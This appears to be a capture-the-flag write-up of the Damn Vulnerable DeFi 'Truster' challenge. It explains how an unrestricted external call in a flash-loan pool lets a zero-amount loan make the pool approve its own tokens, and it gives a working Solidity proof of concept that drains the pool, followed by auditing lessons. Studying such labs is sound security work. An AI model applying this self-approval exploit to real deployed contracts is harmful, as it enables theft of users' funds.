---
title: 'Damn Vulnerable DeFi - Truster'
description: 'Arbitrary external calls leading to full permission leaks. Learn how a single flash loan call can trick a contract into approving away its entire treasury.'
date: 2025-07-04
tags: ['solidity', 'security', 'external-call', 'approval-leak', 'audit', 'damn-vulnerable-defi','ctf']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 🔓 Truster - Arbitrary External Call Exploitation

## Challenge Overview

The `TrusterLenderPool` offers zero-fee flash loans. The pool holds **1,000,000 DVT**, while the attacker starts with nothing.

**The Mission:**
1. Drain all DVT from the pool in a **single transaction** (nonce = 1).
2. Transfer all stolen funds to the designated recovery account.

---

## Technical Analysis

### The Vulnerable Code

The vulnerability lies in the `flashLoan` function, specifically how it handles external calls:

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data); // <--- CRITICAL VULNERABILITY

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

### The Root Cause: Unrestricted `functionCall`

The line `target.functionCall(data);` allows the caller to define any target contract and any calldata to be executed by the pool contract. 

Because the call is executed *by the pool itself*, any action taken will have the pool's permissions.

### Bypassing the Repayment Check

The pool only checks if its final balance is **not less than** its starting balance:
`if (token.balanceOf(address(this)) < balanceBefore) revert RepayFailed();`

If we borrow **0 tokens**, the balance never decreases. This means the repayment check will always pass, even if we don't "repay" anything.

---

## The Exploit: Self-Approval Attack

1.  **Preparation:** Construct a calldata for `token.approve(player, 1,000,000)`.
2.  **Flash Loan:** Call `flashLoan` with:
    *   `amount = 0` (to bypass repayment).
    *   `target = address(token)` (the DVT token contract).
    *   `data = approval_calldata`.
3.  **Execution:** The pool contract executes the call, effectively saying: *"I hereby authorize the player to spend all 1,000,000 of my DVT tokens."*
4.  **Theft:** After the flash loan returns, the player calls `transferFrom` on the token contract to move the pool's funds to the recovery address.

---

## Proof of Concept (PoC)

```solidity
function test_truster() public checkSolvedByPlayer {
    // 1. Prepare approval calldata
    bytes memory data = abi.encodeCall(token.approve, (player, TOKENS_IN_POOL));
    
    // 2. Trigger the "self-approval" via 0-amount flash loan
    pool.flashLoan(0, player, address(token), data);

    // 3. Use the newly acquired allowance to drain the pool
    token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);

    // 4. Satisfy the single-transaction (nonce) requirement
    vm.setNonce(player, 1);
}
```

---

## Auditor's Lessons

1.  **Never allow user-controlled arbitrary calls**: Functions like `call`, `delegatecall`, or `functionCall` with user-supplied targets and data are effectively giving the user the contract's identity.
2.  **Whitelist External Calls**: If external calls are necessary, restrict them to a predefined list of trusted contracts and functions.
3.  **Validate Inputs**: Disallowing 0-amount flash loans would have mitigated this specific bypass, although the arbitrary call remains the root issue.
4.  **Least Privilege**: A contract should never have the logic to approve its own funds to external entities unless absolutely necessary for the business logic.

---

## Real-World Incidents

*   **Euler Finance (2023):** Lost **$196M** partially due to complex logic handling that allowed unintended state manipulations.
*   **Platypus Finance (2023):** Lost **$8.5M** due to a logic flaw in their solvency check which shared similarities with unintended bypasses of repayment logic.
